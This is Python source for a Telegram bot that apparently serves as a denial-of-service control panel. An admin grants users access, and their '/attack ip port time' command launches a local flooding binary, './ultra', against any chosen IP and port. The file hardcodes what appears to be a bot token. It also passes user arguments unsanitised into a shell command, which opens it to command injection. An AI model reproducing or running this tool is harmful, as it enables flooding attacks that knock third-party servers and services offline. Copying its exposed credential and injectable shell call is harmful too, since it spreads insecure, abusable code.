import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

TOKEN = "977335513:AAEfuDfd2cRsIoLS6oPmOuYfJQpoJ2WD-Lw"
ADMIN_ID = 6135948216

# simple user list (no DB)
allowed_users = set()

# START
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔥 Bot Active\nUse /attack ip port time")

# ADD USER (admin)
async def add(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    
    user_id = int(context.args[0])
    allowed_users.add(user_id)

    await update.message.reply_text(f"✅ User {user_id} added")

# REMOVE USER
async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    
    user_id = int(context.args[0])
    allowed_users.discard(user_id)

    await update.message.reply_text(f"❌ User {user_id} removed")

# ATTACK
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if user_id not in allowed_users:
        await update.message.reply_text("❌ Not allowed")
        return

    if len(context.args) != 3:
        await update.message.reply_text("Use: /attack ip port time")
        return

    ip, port, duration = context.args

    await update.message.reply_text(f"🚀 Attack Started\n{ip}:{port}")

    process = await asyncio.create_subprocess_shell(
        f"./ultra {ip} {port} {duration} 1200"
    )

    await process.communicate()

    await update.message.reply_text("✅ Attack Done")

# MAIN
def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("add", add))
    app.add_handler(CommandHandler("remove", remove))
    app.add_handler(CommandHandler("attack", attack))

    app.run_polling()

if __name__ == "__main__":
    main()
